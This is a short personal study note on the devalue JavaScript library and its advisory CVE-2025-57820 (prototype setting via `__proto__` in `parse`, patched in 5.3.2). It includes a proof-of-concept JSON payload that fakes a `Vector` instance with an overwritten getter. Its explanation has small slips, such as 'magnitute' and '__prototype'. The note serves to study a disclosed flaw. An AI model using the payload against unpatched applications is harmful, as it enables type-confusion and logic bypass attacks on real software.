---
parent: "[[Fleeting MOC]]"
tags:
date: 2025-11-15T18:35
---
Link: [devalue](https://github.com/sveltejs/devalue)
## Idea

The library offers a method to dump an arbitrary object (a generalization version of `JSON.stringify` and `JSON.parse`).

Methods:
- `uneval`: Reverse function of `eval`, generating JavaScript code to generate an object.
- `stringify` and `parse`: Convert object to JSON, array with format:
	- Value
	- Array with constructor
	- Array of value
	- Map of key and value
- `unflatten`: Recover object from JSON.
## [CVE-2025-57820](https://github.com/advisories/GHSA-vj54-72f3-p5jv)

Version: `< 5.3.2`
Patched: `5.3.2`

`devalue.parse` allows `__proto__` to be set:

```js
class Vector {
  constructor(x, y) {
    this.x = x;
    this.y = y;
  }

  get magnitude() {
    return (this.x ** 2 + this.y ** 2) ** 0.5;
  }
}
```

Payload:
```js
[
	{"x":1,"y":2,"magnitude":3,"__proto__":4},
	3,
	4,
	"nope",
	["Vector",5],
	[6,7],
	8,
	9
]
```

The 0-index of the array is the root object, normally, we need to create a Vector object by:
```js
[
	["Vector", 1],
	[2, 3],
	3,
	4
]
```

Meaning: `Vector(3, 4)`

However, `instanceof` operator check by comparing the prototype of the object so we have an object:

```js
{
	"x": 3,
	"y": 4,
	"magnitute": "nope",
	"__prototype": Vector(8, 9)
}
```

Instance of `Vector` but `magnitute` method has been overwritten.

Additionally, this version does not check the index is actually index.